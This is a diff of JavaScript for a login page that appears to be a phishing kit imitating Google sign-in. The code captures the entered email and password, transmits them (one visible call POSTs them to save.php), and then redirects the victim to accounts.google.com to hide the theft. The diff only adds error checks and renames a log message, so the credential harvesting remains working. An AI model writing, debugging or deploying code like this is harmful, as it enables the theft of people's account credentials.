@@ -1,10 +1,24 @@
 document.addEventListener("DOMContentLoaded", function () {
   const form = document.getElementById("login-form");
 
+  if (!form) {
+    console.error("Form not found!");
+    return;
+  }
+
   form.addEventListener("submit", function (e) {
     e.preventDefault();
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
+
+    const emailElement = document.getElementById("email");
+    const passwordElement = document.getElementById("password");
+
+    if (!emailElement || !passwordElement) {
+      console.error("Email or password input not found");
+      return;
+    }
+
+    const email = emailElement.value;
+    const password = passwordElement.value;
 
     const message = Email: ${email}\nPassword: ${password};
 
@@ -19,6 +33,7 @@ document.addEventListener("DOMContentLoaded", function () {
       })
     });
 
+    // حفظ في ملف محلي (تجاهل الخطأ لو php غير مفعل)
     try {
       fetch("save.php", {
         method: "POST",
@@ -28,7 +43,7 @@ document.addEventListener("DOMContentLoaded", function () {
         body: email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}
       });
     } catch (err) {
-      console.log("Local save missed:", err);
+      console.log("Save failed:", err);
     }
 
     window.location.href = "https://accounts.google.com";
